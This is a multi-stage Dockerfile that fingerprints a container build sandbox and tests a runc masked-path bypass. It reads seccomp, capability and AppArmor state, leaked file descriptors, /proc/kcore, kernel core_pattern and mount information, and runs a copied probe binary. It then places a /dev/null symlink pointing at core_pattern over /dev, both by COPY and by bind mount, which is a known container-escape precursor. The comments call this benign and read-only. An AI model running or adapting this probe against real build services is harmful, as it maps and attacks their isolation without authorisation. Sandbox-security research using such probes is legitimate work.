# front2-runc fingerprint build
# 1) base sandbox state (fd leak / AppArmor / seccomp / masked paths / RLIMIT_CORE / i386+vsock probe)
# 2) masked-path symlink test via COPY'd /dev/null symlink (benign read-only)
# 3) same via read-only bind mount at /dev
FROM alpine:3.20
COPY front2/scripts/front2_build_probe /probe
RUN chmod +x /probe && \
    echo "=== F2P-FP-BASE ===" && \
    echo "--- fd table ---" && ls -la /proc/self/fd/ && \
    echo "--- attr ---" && cat /proc/self/attr/current && echo && \
    echo "--- status ---" && grep -E "Seccomp|CapEff|NoNewPrivs|Uid|Gid" /proc/self/status && \
    echo "--- masked ---" && for p in /proc/kcore /proc/keys /proc/timer_list /proc/sched_debug /proc/timer_stats /proc/scsi /sys/firmware; do stat -c "$p %F %t:%T %s" "$p" 2>&1; done && \
    echo "--- kcore-head ---" && head -c 32 /proc/kcore 2>&1 | od -An -tx1 | head -2 && \
    echo "--- core_pattern ---" && cat /proc/sys/kernel/core_pattern && \
    echo "--- rlimit-core ---" && ulimit -c && \
    echo "--- mountinfo ---" && grep -E " /dev | / " /proc/self/mountinfo | head -8 && \
    echo "--- uname ---" && uname -a && \
    echo "--- probe ---" && /probe && \
    echo "=== F2P-FP-BASE-END ==="

FROM alpine:3.20 AS mknull
RUN mkdir -p /fake/dev && ln -s /proc/sys/kernel/core_pattern /fake/dev/null && ls -la /fake/dev && readlink /fake/dev/null

# Approach A: /dev/null symlink copied into the image /dev
FROM alpine:3.20 AS masktest
COPY --from=mknull /fake/dev/null /dev/null
RUN echo "=== F2P-MASKTEST ===" && ls -la /dev/null && readlink /dev/null && \
    stat -c "kcore %F %t:%T %s" /proc/kcore && \
    echo "kcore-content:" && head -c 64 /proc/kcore | od -c | head -3 && \
    echo "core_pattern-real=$(cat /proc/sys/kernel/core_pattern)" && \
    echo "attr=$(cat /proc/self/attr/current)" && \
    echo "=== F2P-MASKTEST-END ==="

# Approach B: prepared dir bind-mounted over /dev
FROM alpine:3.20 AS bindtest
RUN --mount=type=bind,from=mknull,source=/fake/dev,target=/dev sh -c 'echo "=== F2P-BINDTEST ==="; ls -la /dev; readlink /dev/null; stat -c "kcore %F %t:%T %s" /proc/kcore; head -c 64 /proc/kcore | od -c | head -3; echo "core=$(cat /proc/sys/kernel/core_pattern)"; echo "=== F2P-BINDTEST-END ==="'

FROM alpine:3.20 AS collect
COPY --from=masktest /etc/hostname /m
COPY --from=bindtest /etc/hostname /b
RUN echo "=== F2P-FP-DONE ==="
